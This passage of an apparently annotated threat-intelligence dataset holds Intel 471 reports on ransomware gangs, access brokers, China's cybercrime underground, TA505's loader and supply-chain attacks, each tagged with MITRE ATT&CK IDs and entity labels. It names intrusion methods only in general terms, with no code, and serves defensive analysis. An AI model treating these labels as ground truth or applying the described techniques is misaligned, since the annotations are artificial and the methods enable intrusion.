ransom.\nNetwalker has been tied to 143 ransomware incidents in 2020.\n**REvil**\nOne of the most ubiquitous ransomware variants on the market, deployments of REvil first were observed on April 17, 2019, where attackers leveraged a vulnerability in Oracle WebLogic servers tracked as CVE-2019-2725.\nTwo months later, advertisements started popping up on the XSS forum.\n[REvil has been](https://intel471.com/blog/changes-in-revil-ransomware-version-2-2/) one of the most active ransomware gangs in recent memory, claiming responsibility for such attacks as those on U.K.-based financial service provider [Travelex](https://techcrunch.com/2020/01/02/travelex-malware/), U.S.-based entertainment and [media law firm](https://www.businessinsider.com/trump-data-ransomware-grubman-law-firm-madonna-2020-5) Grubman Shire Meiselas & Sacks and [23 local governments in Texas](https://www.zdnet.com/article/at-least-20-texas-local-governments-hit-in-coordinated-ransomware-attack/).\nOne of the most common ways the group gains access to organizations is through remote desktop protocol (RDP) vulnerabilities, such as [the BlueGate vulnerability](https://www.securityweek.com/poc-exploits-created-recently-patched-bluegate-windows-server-flaws), which allows remote code execution by an authorized user.\nThe representative admittedly preferred to use information stealers to obtain remote access credentials, which are then used to secure an initial foothold in company networks.\nIn the case of the Travelex and Grubman Shire Meiselas & Sacks attacks, the representative said networks were compromised by exploiting outdated [Citrix](https://www.cyberscoop.com/citrix-vulnerability-backdoor-fireeye/) and [Pulse Secure](https://www.zdnet.com/article/top-exploits-used-by-ransomware-gangs-are-vpn-bugs-but-rdp-still-reigns-supreme/) remote access software, with the actors allegedly gaining access to an entire network in \"about three minutes.\nWhile the group carries out attacks on its own, it has found the RaaS model brings back more money.\nAffiliates are responsible for gaining access to target networks, downloading valuable files and deploying the actual ransomware, while the REvil gang handles victim negotiations and blackmailing, ransom collection and distribution.\nThis model has apparently led to skyrocketing profits: according to the REvil representative, one affiliate's earnings rose from about US$20,000 to US $30,000 per target with another RaaS offering to about US $7 million to $8 million per target in only six months after joining forces with REvil.\nIntel 471 has linked REvil to 230 ransomware attacks in 2020.\n**Ryuk**\nThe name \u201cRyuk\u201d could arguably be categorized as synonymous with ransomware, as the variant is one of the most popular, with a strong affiliate program and a large list of victims.\nIt is often delivered as the last action in the chain of infections brought on by dueling use of the Trickbot botnet and Emotet malwares.\n([Intel 471 has previously covered that relationship](https://intel471.com/blog/understanding-the-relationship-between-emotet-ryuk-and-trickbot/).\nRecently, we have also witnessed that Ryuk is delivered through the Bazar loader.\nAffiliates follow a model in their attacks: Hiring actors to launch spam campaigns to deliver the actor's banking malware.\nThen, another set of actors conduct privilege escalation attacks within compromised corporate networks.\nThen, teams of as many of five deploy the ransomware and handle negotiations with victims.\nRyuk has exploded over the past year, responsible for millions of ransomware incidents around the world.\nSome security researchers estimate that Ryuk has been found in as much as one-third of ransomware attacks launched this year.\nOne of the biggest threats from Ryuk this year has been focused on the healthcare sector.\nThe attack that drew the most headlines was the attack on Universal Health Services, one of the biggest hospital systems in the United States.\nWhile the cybersecurity community recognizes the threat all of these groups present, the criminals are only one part of the picture.\nIn our next entry, Intel 471 will examine what a business goes through once it has to recover from a ransomware attack.", "mitre_ids": ["T1486", "T1486", "T1486", "T1486", "T1486", "T1486", "T1486", "T1486", "T1486", "T1486", "T1486", "T1486", "T1486", "T1189", "T1189", "T1189", "T1189", "T1189", "T1189", "T1190", "S0575", "T1190", "S0583", "T1190", "T1190", "T1189", "T1486", "T1486", "S0570", "T1486", "S0570", "T1486", "TA0010", "T1486", "T1486", "S0554", "S0449", "S0449", "T1486", "S0554", "T1486", "S0554", "T1486", "TA0010", "T1486", "S0554", "T1486", "S0554", "T1027", "S0554", "S0554", "S0449", "T1486", "S0554", "S0457", "S0457", "T1566", "T1548", "S0457", "S0457", "S0457", "T1486", "S0496", "T1486", "S0496", "T1190", "T1189", "S0496", "T1486", "T1190", "T1190", "T1190", "T1486", "TA0001", "T1486", "S0496", "TA0010", "T1486", "S0496", "T1486", "S0496", "S0496", "T1486", "S0446", "S0446", "T1486", "S0266", "S0367", "S0446", "S0534", "T1566", "TA0004", "T1486", "S0446", "T1486", "S0446", "T1486", "S0446", "T1486"], "anno_name_label": [["GROUP", "DarkSide"], ["MALWARE", "Thanos"], ["MALWARE", "DoppelPaymer"], ["MALWARE", "DoppelPaymer"], ["MALWARE", "DoppelPaymer"], ["MALWARE", "DoppelPaymer"], ["MALWARE", "DoppelPaymer"], ["MALWARE", "DoppelPaymer"]], "cti_entity_class": ["CI", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Steal, then strike: Access merchants are first clues to future ransomware attacks\nDec 01, 2020\nCybercrime does not happen in a vacuum.\nWhile ransomware variants like REvil, Ryuk and DoppelPaymer have become household names for cybersecurity professionals, those deploying ransomware only represent part of the process by which criminals are forcing organizations to either pay them millions or watch their business go under.\nThe broader picture shows an underground marketplace that is increasingly becoming more organized, borrowing best practices from legitimate businesses that understand the importance of resiliency, efficiency and return on investment.\nA key cog in this growing operation is the interdependency between those who specialize in selling access to compromised systems or stolen information, and those looking to launch ransomware attacks.\nData gathered by Intel 471 points to a pattern in numerous ransomware attacks that have occurred in the past 18 months: Criminals in underground forums will advertise access to various breached organizations, and quickly turn to sell access to the highest bidder or strike a deal with an ransomware affiliate in order to share in any profits pulled from a successful payment.\nThese partnerships have resulted in a flourishing submarket, where access to corporate networks is sold for six-figure sums directly or via a partnership and cut of paid ransoms.\nThe compromised credentials are mostly obtained through attackers abusing flaws or security shortcomings in virtual private networks or remote desktop protocol endpoints, which provides the initial entry point into enterprise networks.\nAdditionally, credential information can come from logs tied to infostealer malware, password spraying or other credential marketplaces in the criminal underground.\nInstances show that anywhere from one week to six months after access is obtained and advertised, other known actors on various underground forums look to use or purchase that access to launch ransomware attacks.\nThe targets run the gamut of regions and economic sectors, with the pattern playing out in ransomware attacks on every continent.\nOne of the highest-profile ransomware attacks to fit this pattern was the attack on Pemex, the state-run oil company based in Mexico.\nIn November 2019, attackers hit Pemex with DoppelPaymer, demanding $4.5 million in bitcoin to decrypt and return the files.\nIntelligence from Intel 471 found that beginning in June 2019, a separate actor was advertising access to 1,500 Pemex servers and personal computers, as well as administrator privileges to the company\u2019s domains, for $150,000.\nThat transaction was facilitated through a third-party escrow service, which allows criminals to move money in order to shield themselves from making direct contact with the actors who are carrying out the crimes.\nAnother actor Intel 471 had been tracking started asking for access to ransomware-as-a-service affiliate programs, stating that deployment of ransomware on compromised networks should potentially return much more money than just selling the access.\nDays after this, Intel471 learned the actor obtained and modified a version of Thanos, and allegedly deployed it against U.S. businesses.\nOver the past three months, this actor has frequently tried to sell access to compromised organizations, which range in location, size, and economic sector.\nAccess merchant partnerships are not exclusive to any one particular ransomware variant or ransomware-as-a-service.\nData from Intel 471 shows this pattern following attacks carried out with popular ransomware variants, such as DoppelPaymer, Maze, Netwalker, Ryuk and REvil, as well as lesser-known variants like LockBit, Nefilim, Pysa and Thanos.\nThe astronomical growth in ransom payments in 2020 has helped access merchants put a premium on their services.\nIn years past, a large ransom payout would earn attackers somewhere between five- and six-figure sums.\nNow, it\u2019s becoming increasingly common for attackers to demand seven- and eight-figure ransoms, partly due to the need to pay off actors that have helped them obtain access to the victim\u2019s system.\nOne such attack drives home this point: Intel 471 obtained a chat log from a ransomware attack launched last month where a company \u2014 a U.S.-based healthcare provider \u2014 offered to pay a ransom of just under $400,000.\nDespite the company\u2019s quick response, the ransomware crew was insulted by the offer and threatened to dump the entire cache of stolen documents unless the figure was pushed several million dollars higher.\nWith their backs against the wall, the company eventually settled to pay $2 million in bitcoin.\nHow long ransomware crews decide to stay with this partnership model will be something to watch in the coming year.\nIntel 471 has observed actions in underground marketplaces that show RaaS groups are beginning to undercut access merchants, by either purchasing their own credential-stealing malware or recruiting teams that specialize in obtaining access.\nUse of access merchants may not disappear completely, but the extent of their popularity could diminish.\nTo prevent being a victim, enterprises need to have continuous and proactive observation of the cybercriminal underground marketplace where these interdependent products, services and goods intersect.\nAdditionally, ensuring token-based multi-factor authentication is enabled across an enterprise and scrutinizing all internet-facing remote network connections like RDP can be vital in preventing ransomware attacks.\n*This article was part of a series on ransomware attacks in 2020.\nYou can find the previous entries here:\n[Part 1](https://intel471.com/blog/ransomware-as-a-service-2020-ryuk-maze-revil-egregor-doppelpaymer/) and\n[Part 2](https://intel471.com/blog/how-to-recover-from-a-ransomware-attack/).*", "mitre_ids": ["T1486", "T1486", "S0496", "S0446", "T1486", "T1486", "T1078", "T1486", "T1486", "T1078", "T1078", "T1078", "T1110", "T1486", "T1078", "T1486", "T1486", "T1486", "T1078", "T1486", "T1486", "T1486", "T1078", "T1486", "T1486", "T1486", "S0449", "S0457", "S0446", "S0496", "S0583", "T1078", "T1486", "T1486", "T1486", "T1486", "TA0006", "T1486", "T1486", "T1486"], "anno_name_label": [["MALWARE", "DoppelPaymer"], ["MALWARE", "DoppelPaymer"], ["MALWARE", "Thanos"], ["MALWARE", "DoppelPaymer"], ["MALWARE", "LockBit"], ["MALWARE", "Nefilim"], ["MALWARE", "Thanos"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI"]}, {"cti_report": "No pandas, just people: The current state of China\u2019s cybercrime underground\nDec 10, 2020\nChina's internet is a lot different than the rest of the world.\nYet, that hasn't stopped its population from engaging in cybercrime.\nDespite the various measures the Chinese government has taken to censor and surveil its residents on the internet, a significant cybercrime underground full of financially motivated actors exists.\nEfforts like \"The Great Firewall\" or government crackdowns on content related to cybercrime force actors to put in remarkable effort to maneuver around those roadblocks in order to access, create or participate in criminal marketplaces that mirror those more commonly known to the rest of the world.\nData from Intel 471 show that the Chinese cybercrime underground proliferates through use of common methods or platforms, but behaves differently in large part due to the caution that actors take with regard to their identity.\nWhile the average citizen must follow the heavy handed nature of the government's surveillance of cyberspace, Chinese threat actors take special precautions to protect their forums, TTPs and themselves.\nThis leads to the Chinese cybercrime underground being disorderly when compared to others, particularly Russia, which tend to be much more organized.\nWhere is the Underground.\n-------------------------\nForums hosted on the Tor network have barriers to entry for most Chinese users as the government blocks Tor on the Chinese internet.\nIn order for actors operating in mainland China to access these services, they need a VPN or similar measure capable of evading government detection.\nGuides and toolkits that allow a user to accomplish this task are often available on the underground.\nHowever, if actors do break through \u2014 or are operating from other popular Chinese cybercriminal hubs like Hong Kong, Malaysia, Myanmar, The Philippines, and Taiwan \u2014 there are a host of forums used by cybercriminals.\n### DeepMix Market\nDeepMix Market is one of the most well-known Chinese underground marketplaces, even after disappearing for several weeks in 2019 after a sustained DDoS attack.\nIt eventually resurfaced in December 2019, with enhanced protections for its users.\nThe marketplace's offerings are categorized into several sections, including \"data-information,\" \"service-orders,\" virtual resources, physical goods, techniques and tutorials, and carding materials/CVVs, among others.\nIt also uses heightened measures to ensure anonymity, such as discouraging users to post contact details, encouraging users to buy and sell things via the in-forum system, and forcing users to use small numeric handles to identify accounts.\nActors on DeepMix have used the same handles for long periods of time in order to build brand awareness, reflecting that reputation is still paramount even as identity is a highly sensitive subject.\n### United Chinese Escrow Market\nThe United Chinese Escrow Market, or UCEM, was established in June 2018 to sell goods and services like those on DeepMix, but differs in that users can set up their own independent shops instead of relying on one central purchasing hub.\nMarketplace postings are listed in U.S. dollars, but bitcoin is the only accepted currency for transactions, with an exchange rate determined by a third-party payment service provider.\nThe site also has functions similar to other ecommerce sites, including sections where users can discuss their transaction experience, an internal mailbox function to communicate with other members, a bitcoin wallet management section.\n### Tea Horse Road\nEstablished in June 2019, Tea Horse Road is similar to UCEM and DeepMix in allowing for trading different goods and services, but the site also includes a forum where users discuss or sell data, vulnerabilities or other virtual and physical goods.\nEarlier this year, Intel 471 saw a number of marketplace users spin up Telegram channels that were affiliated with the site, made in order to provide an extra layer of security when discussing listings or other site-related matters.\nThese channels are very active, with users heavily engaged in discussions while being careful not to include information that might reveal account handles on the actual site.\n### Free City\nFree City is similar to Tea Horse Road, particularly due to use of Telegram channels.\nThe marketplace has seven sections for users: data and intel, services and order replacement, virtual resources, physical goods, specialized products, CVV and carding, and private escrow transactions.\nThe Telegram channels allow users to discuss what's for sale in the forums, while also hosting tutorials and other information related to making purchases.\n### Open Web forums\nOpen web hacking forums where Chinese cybercriminals congregate do exist, but often get shut down by the Chinese government.\nThere have been numerous initiatives launched under Chinese President Xi Jinping that have led to the crackdown of what the government has deemed to be illicit internet content.\nIn April 2020, China's Ministry of Public Security announced it punished 1,522 people for public security and notified other departments to give 433 party and political sanctions for matters related to cybercrime.\nSome of the more popular open web forums, like HLODAY or HZDG (\u534e\u4e2d\u5e1d\u56fd, also known as China Central Empire), have gone down during this time.\nMore often, skilled Chinese actors make their way to international forums, such as Exploit, Hack Forums, Raid Forums and XSS. These actors advertise tools and services like any other member: compromised payment cards, information or data, ransomware, cryptomining malware and more.\n### Messaging Clients\nThe Telegram channels tied to Tor services is indicative of another trend: Chinese actors like to use messaging clients to converse with each other in the underground.\nThis is partly due to the familiarity of the greater Chinese population with messaging platforms like WeChat and QQ, which are extremely popular among Chinese internet users.\nHowever, those platforms fall under the same government restrictions as the rest of the country's internet.\nTherefore, we have seen Chinese actors move to non-native messaging services like Telegram.\nNon-native services decrease the likelihood of linking online personas to real offline identities, as well as provide end-to-end encryption to ensure greater anonymity.\nHow are they accessing the underground.\n---------------------------------------\nBecause of the anonymity and censorship circumvention needed to develop and sell malware or stolen data, Chinese actors have learned to be extremely adaptable.\nThe Chinese government's efforts to watch its population's internet activity means there is no anonymous access, since an IP address can be tied to an actual person.\nThis results in the anonymity of a Chinese actor being \"thinner\" than in other areas of the world.\nIn order to evade detection, Chinese actors will change IP addresses by joining different WiFi networks and getting modems to request a new dynamic host configuration protocol (DHCP) addresses, use the TOR network, leverage VPN and proxy services to bypass the Great Firewall, use codewords to avoid keyword filters, and tools such as shadowsocks relay (ssr) and V2Ray.\nAdditionally, the fact that some actors do manage to bypass the censorship measures and access international sites and services means that although the latest tools and techniques are available to the Chinese underground, not everyone has access to them.\nThis has led to a trend of Chinese actors modifying source code of freeware and malware families to develop their own versions for use, distribution and sale, or using popular forums such as GitHub to refine their skills, fine tune tools or access the latest malware.\nWhat do they sell on the underground.\n-------------------------------------\nBecause getting around the Great Firewall can be so difficult, a lot of the malware being pushed on Chinese cybercriminal underground forums is built upon existing tools.\nIntel 471 has observed numerous Remote Access Trojans (RATs) that are variants of already known malware or pentesting tools, such as:\n* Anubis\n* AsyncRAT\n* Cobalt Strike\n* Gh0st\n* Gray Pigeon\n* Gray Wolf\n* NjRAT\n* Spynote\nWe also observed popular tools such as worms, brute forcers, DDoS tools and post-exploitation tools, as well as exploits for vulnerabilities in web servers for Apache, Oracle and Microsoft Windows.\nThere was also interest in software that mines cryptocurrencies while also attempting to steal wallets or credentials to access online wallets.\nAdditionally, both international (GandCrab, WannaCry) and domestic (FilesLocker) variants of ransomware were placed on various forums.\nSpecific behavior that stood on these forums was: hacking of illegal gambling sites, QQ tools, blackhat search engine optimization services, spamming, scamming, and other actions that lead to ripping off other members of the cybercriminal underground.\nWhat does the future hold.\n--------------------------\nAs long as the Chinese government shows the ability and desire to crack down on its population's internet activity, highly-skilled actors will continue to closely guard their skills and identity in an effort to avoid being caught.\nPetty criminals and script kiddies may thrive while the proficient will continue to fly under the radar by avoiding public posts of high-profile breaches, access and or custom tools.\nWith the censorship and surveillance practices carried out by the Chinese government unlikely to stop, the variety of forums, as well as different TTPs employed by actors, likely will continue to adapt and evolve in order to make as much money as possible.\nThe above information has been pulled from an Intel 471 whitepaper that has further in-depth information on the Chinese cybercrime underground.\nTo inquire about the whitepaper and more how Intel 471 enables proactive security teams, [get in contact with us](https://intel471.com/contact/).", "mitre_ids": ["T1499", "T1486", "T1189", "T1496", "S0154", "S0032", "S0385", "T1110", "T1499", "T1190", "T1496", "TA0006", "S0366", "T1486", "T1486"], "anno_name_label": [["MALWARE", "Anubis"], ["MALWARE", "AsyncRAT"], ["MALWARE", "Gray Pigeon"], ["MALWARE", "Gray Wolf"], ["MALWARE", "Spynote"], ["MALWARE", "GandCrab"]], "cti_entity_class": ["CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CE", "CI"]}, {"cti_report": "More annoying than crippling: Joker\u2019s Stash takedown is temporary\nDec 17, 2020\nLaw enforcement has allegedly seized proxy servers used in connection with the blockchain-based domains belonging to Joker's Stash, a prolific vendor of compromised financial card data in the cybercrime underground.\nOn December 17, an image adorned the shop's website that claimed the U.S. Federal Bureau of Investigation and Interpol had taken it into law enforcement's possession.\nAfter noticing the action, Joker's Stash operators took down the site completely.\n![](https://d39ec1uo9ktrut.cloudfront.net/splash-e1608237933863.png)\nThe image that greeted users if they visited Joker's Stash's blockchain-based website on Dec. 17, 2020.\nShortly after the action, the site's operators took to several underground forums to deal with the fallout.\nMessages claimed that the external proxy server associated with their blockchain-based domain name was seized.\nAt the same time, the actor stressed the shop would go back to normal in a couple of days after access was restored.\nThe actor also suggested that people should use the forum's Tor-based domain in the meantime, which is still working.\nWe believe that this action will only serve as a temporary issue for the site.\nBlockchain-based DNS differs from traditional DNS, particularly in the sense that law enforcement cannot seize the domain name of the site, just the IP address of the server it points to.\n[Joker's Stash has been using this infrastructure since 2017](https://www.recordedfuture.com/jokers-stash-infrastructure/) as both an added security measure and a way to minimize barriers for new customers.\nThe actors told worried customers on one particular forum that law enforcement did not seize the site's particular IP address, and even if they did, there was no data on the servers themselves.\nThe actor said that within a few days, new proxies will be configured, linked back to the seized domain, and the shop's blockchain-based site will resume normal functions.\nOne of the most well-known cybercriminal shops in the world, Joker's Stash has had a rough second half of 2020.\nIn October, the actor who allegedly runs the site announced he had contracted COVID-19, spending a week in the hospital.\nThe condition impacted the site's forums, inventory replenishments and other operations.\nIntel 471 has also observed the site's clients complaining that the shop's payment card data quality was increasingly poor.\nThis comment points to the changing nature of the cybercriminal underground, where actors are moving away from carding-related crimes.\nIf that trend continues into 2021, Joker's Stash standing as a preferred home of criminal activity could change.\n\"It's apparent that major intrusions resulting in valuable stock for sale across his shop has taken a bit of a dive over the last year,\" said Intel 471 VP of Intelligence Mike DeBolt.\n\"This could be a result of many things, from the pandemic to the massive shift of many cybercriminals to ransomware, where significantly less effort can lead to marginally higher profits.\n\"Payment card fraud has shifted its attention to e-commerce targets due to a handful of factors including the pandemic forcing consumers to stay at home, and the rise of Magecart-type attacks,\" said a security expert in the financial services industry who asked to remain anonymous.\n\"It doesn't appear Joker's Stash has pivoted his business model to address this reality, which may be the reason why we are seeing a decline in sales in his shop.\nIt remains to be seen how Joker's Stash reacts to this in 2021 and beyond.\nIntel 471 will continue to watch how Joker's Stash and the greater cybercrime underground react to actions taken by law enforcement.", "mitre_ids": ["T1486"], "anno_name_label": [["GROUP", "Magecart"]], "cti_entity_class": ["CE", "CE"]}, {"cti_report": "TA505\u2019s modified loader means new attack campaign could be coming\nDec 18, 2020\nAfter months of inactivity, hacking group TA505's Get2 Loader has sprung back into operation, possibly signaling that the group is ready for a new round of malicious activity.\nOn December 14, 2020, the Get2 loader had resurfaced with new download and execute configuration parameters named \"LD\" and \"ED.\nIntel 471 last observed the loader in operation on September 14, 2020.\nThe \"LD\" parameter reflectively loads a downloaded dynamic-link library (DLL) file into the address space of the current process and calls its entry point.\nThe \"ED\" parameter copies the DLL into executable memory and invokes the entry point directly.\nThe preexisting \"RD\" parameter that was used to inject the downloaded DLL into EXCEL.EXE can now perform injection into WINWORD.EXE as well.\nThe reconfigured loader is meant to allow the group to carry out its operations without drawing the attention of enterprise defenses.\nIn the past, it has been used to download the SDBbot, FlawedGrace and other malware.\nTA505 is a prolific Russian-speaking, financially-motivated group that is known for launching large-scale targeted attacks.\nThe group [was most recently discovered](https://www.darkreading.com/attacks-breaches/ta505-targets-hr-departments-with-poisoned-cvs-/d/d-id/1337355) going after German-speaking targets with weaponized CVs.\nIntel 471 also observed the group going after targets in Japan, South Korea, United Arab Emirates in 2019.\nOnce the group's malware or actions are caught by researchers or the press, the group tends to go silent in an effort to reconfigure its tools.\nDrawing from past experiences, Intel 471 believes that new, undiscovered malware campaigns will follow with the introduction of the reconfigured Get2 Loader.\n\"TA505 can be somewhat deliberate in how they operate, more so than most of the financially-motivated groups we track,\" said Intel 471 COO Jason Passwaters.\n\"Once things start ramping up like this, rest assured they are back at it with a target list in hand.\nThe Intel 471 adversary intelligence on major threat groups such as TA505 and our unique insight into its capabilities, intent and motivations, can be leveraged by threat intelligence teams to remain proactive and resilient against attacks as cybercriminals modify TTPs.", "mitre_ids": ["G0092", "G0092", "S0460", "S0460", "T1105", "T1620", "T1055", "T1055", "TA0005", "T1105", "G0092", "S0460", "G0092", "G0092"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CE"]}, {"cti_report": "Nation-states are taking their supply-chain attack strategy from the cybercriminal underground\nJan 15, 2021\nIt\u2019s clear the SolarWinds incident has rocked the infosec community to its core, with the still-unfolding episode expected to reverberate in the industry for years to come.\nWhile there is still much to be uncovered, the public details point to [a known Russian APT](https://www.cisa.gov/news/2021/01/05/joint-statement-federal-bureau-investigation-fbi-cybersecurity-and-infrastructure) inserting code into a third-party IT provider\u2019s services, allowing for further targeting of approximately 50 organizations.\nThis type of incident, commonly referred to as a \u201csupply-chain attack,\u201d has been the cornerstone in some of the biggest security incidents of the past decade.\nAs we have seen these attacks grow, a similar pattern of behavior has started to emerge: what started as a technique in the cybercriminal underground has become a hallmark of elite-level nation-state hacking groups that have refined it to maximize its impact.\nThere has been a rise in events the past few years where actors aligned with governments are using supply-chain attacks for nation-state-level work.\nIn these instances, third-party IT providers are consistently targeted, serving as a stepping stone that allows these actors to either sell access to the breached systems or pull data for other parties that have expressed interest.\nThe most well-known supply-chain attacks of the past decade are now security parables: Russian-linked criminals have attacked ATMs for years with [different types](https://www.theguardian.com/technology/2014/oct/08/cash-machine-atm-malware-tyupkin) [of malware](https://www.vice.com/en/article/538ebn/atm-hack-russia-disappearing-malware).\nAn unidentified hacking group was able to [breach a casino through a fish tank](https://money.cnn.com/2017/07/19/technology/fish-tank-hack-darktrace/index.html) that was connected to the internet.\nA litany of e-commerce sites, from Ticketmaster to British Airways to OXO, had the JavaScript in [their third-party payment forms](https://www.wired.com/story/magecart-amazon-cloud-hacks/) hijacked in order to send credit card information to various criminal groups.\nThe common thread in these attacks was motivation: it\u2019s believed that those attacks were all carried out by financially-motivated hackers, looking to take credit card numbers or other payment information.\nCriminals aren\u2019t only trying to go after payment information in their supply chain attacks.\nIn August 2019, attackers hit a managed services provider that worked with local government agencies [in 22 Texas towns](https://www.npr.org/2019/08/20/752695554/23-texas-towns-hit-with-ransomware-attack-in-new-front-of-cyberassault), launching a ransomware attack that brought city services and financial actions to a halt.\nThat attack was carried out through [a version of the MSP\u2019s remote access tool](https://www.crn.com/news/channel-programs/msp-at-center-of-texas-ransomware-hit-we-take-care-of-our-customers-#:~:text=Master%20MSP%20IT%20By%20Design,ransomware%20to%20recover%20its%20systems.), which attackers got access to during a different supply chain attack in June 2019.\nAs history has shown us, what can be used to make money can also be turned into a geopolitical weapon.\nThe devastating NotPetya attack was launched in part via a supply chain attack, when Ukrainian accounting software MeDoc was breached, resulting in a software update release that was laced with malware being pushed to users.\nThe U.S. government estimated the attack, which crippled a slew of international companies, [caused $10 billion worth of damage](https://www.wired.com/story/notpetya-cyberattack-ukraine-russia-code-crashed-the-world/).\nThe act is largely believed to have been conducted by the Russian government.\nThe NotPetya attack was a watershed moment that has served as the blueprint for how supply chain attacks have become a well-worn tool of those conducting espionage or acting on behalf of a government.\nIntel 471 has seen an uptick in these actions over the past few years, well before SolarWinds commanded the community\u2019s attention.\nA stark example of this behavior comes from a prolific actor with suspected ties to the Iranian government.\nIn 2019, Intel 471 observed this actor on a popular underground forum advertising access to a wide array of corporate systems: a domain registrar, a ship builder, two large airlines, financial institutions, a media broadcaster, international oil and gas companies, a global online trading platform, cybersecurity companies, a U.S. enterprise information management company and a U.S. cable and satellite TV company.\nThe actor boasted that he obtained this access by finding it when they used a password-spraying technique against large numbers of Office 365 and Citrix account interfaces.\nThey also claimed to obtain access via RDP, and in web-based exploits, bypassing antivirus detection and exploiting already compromised email accounts that lack two-factor authentication.\nFrom there the actor pulled valuable data on future targets\nThe tactics, techniques and procedures used by this actor links them to the Mabna Institute, an Iranian government contractor that has been responsible for coordinated attack campaigns since 2013.\n[Citrix told its customers last year](https://krebsonsecurity.com/2020/02/hackers-were-inside-citrix-for-five-months/) that it found hackers were its systems for months in order to claim a foothold in other enterprise systems.\nAnother alleged government-linked group started taking advantage of supply chain attacks even before NotPetya.\nIn 2017, there were several incidents targeting ATMs across South Korea, after two software vendors were compromised.\nThe malware eventually allowed the perpetrators to gain access to 2,500 accounts at a major international bank, which were then used for an unspecified number of fraudulent transfers.\nIntel 471 found that actors possibly linked to North Korea found a way to manipulate the companies\u2019 antivirus update server that allowed them to upload a remote access trojan (RAT) to the compromised ATM machines.\nThere are numerous reasons why governments have either copied or outsourced these TTPs.\nAllowing cybercriminals to operate with their own skills and tools allows governments to save money in training and development, leveraging capabilities and a \u201cworkforce\u201d they don\u2019t have to build themselves.\nBut a key asset is also the ability to \u201chide in the noise\u201d created by cybercriminals and the marketplaces they frequently use.\nIf the TTPs of a supply chain attack bear the hallmarks of financially-motivated actors, governments are given an extra layer of protection, plausible deniability and obfuscation from being labeled as responsible for a particular incident.\nWhile the SolarWinds incident will be pored over in the months to come, it is only one in a growing list of incidents that show that not only are supply-chain attacks a common practice, they are effective for both financially-motivated criminals and government-backed campaigns alike.\nIntel 471 has previously observed criminal actors advertising access to SolarWinds, years before this current incident was alleged to begin.\nInformation technology companies that serve as the bedrock of enterprise\u2019s technology stack need to be on the lookout for these actions, or run the risk of being a key vector for a monumental security event.\nThe ability to shield true motive should force all enterprises to closely examine their relationships with every third-party business they work with, including efforts to fold it into their security and risk mitigation strategies.", "mitre_ids": ["T1195", "T1195", "T1195", "T1195", "T1195", "T1195", "T1059", "TA0010", "T1195", "T1486", "T1486", "T1195", "S0368", "T1195", "T1195", "S0368", "T1195", "T1110", "T1190", "TA0005", "S0368", "T1195", "TA0009", "T1195"], "anno_name_label": [["TECHNIQUE", "Remote Desktop Protocol"]], "cti_entity_class": ["CI", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI"]}, {"cti_report": "Emotet takedown is not like the Trickbot takedown\nJan 27, 2021\nOn Wednesday, January 27, U.S. and European law enforcement agencies [announced](https://www.europol.europa.eu/newsroom/news/world%E2%80%99s-most-dangerous-malware-emotet-disrupted-through-global-action) that they had seized control of Emotet, the notorious botnet that\u2019s been used by cybercriminals all over the world for the past decade.\nBased on the information available to Intel 471, the law enforcement operation took place Jan. 26, 2021, resulting in the arrest of several Ukrainian nationals allegedly responsible for running the botnet\u2019s infrastructure.\nOnly time will tell if the takedown will have a long-term impact on Emotet operations.\nThe groups who run these botnets are sophisticated and resilient, and will most likely have some sort of inherent recovery in place.\nEmotet itself does not appear to have any sort of recovery mechanism, but a lot of the infected machines will have other malware installed as well, such as Qbot, [Trickbot](https://intel471.com/blog/trickbot-update-november-2020-bazar-loader-microsoft/) or something else.\nThat could be leveraged to rein in the infected machines and put them back under their control.\nYet, right now, those bots are talking to servers controlled by the good guys.\nAdditionally, oftentimes groups like this tend to be composed of members spread across different countries, some of which may not be so open to cooperating with international law enforcement.\nThis leaves open the possibility that someone will simply take the code and rebuild.\nA rebuild or recovery won\u2019t be hard to detect, however.\nThose scenarios aside, what was announced on Wednesday is very promising.\nThe effort is a shining example of what needs to be done in order to have any real impact on these organized cybercrime groups.\nThe difference between disruption and takedown boils down to criminals being put in handcuffs.\nIt\u2019s the pinnacle of a takedown operation and the only way to have a long term impact on the health and safety of the internet.", "mitre_ids": ["S0367", "S0266", "S0367", "S0367", "S0367", "S0266"], "anno_name_label": [["MALWARE", "QBot"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Bulletproof hosting: How cybercrime stays resilient\nFeb 23, 2021\nIf we were to list all of the malicious acts carried out by cybercriminals who leverage bulletproof hosting (BPH), we\u2019d have a report that would rival \u201cInfinite Jest\u201d or \u201cWar & Peace\u201d for length.\nBulletproof hosting has been hand-in-glove with cybercrime for decades, supplying criminals with the infrastructure they need to carry out their crimes.\nBut by pinpointing the role BPH plays in cybercrime\u2019s functionality, security practitioners can be armed with another set of indicators by which they can detect bad behavior before it impacts their organization\u2019s operations or bottom line.\nBelow are some popular malware families that actors host or leverage via BPH services.\nWhile much more goes into a 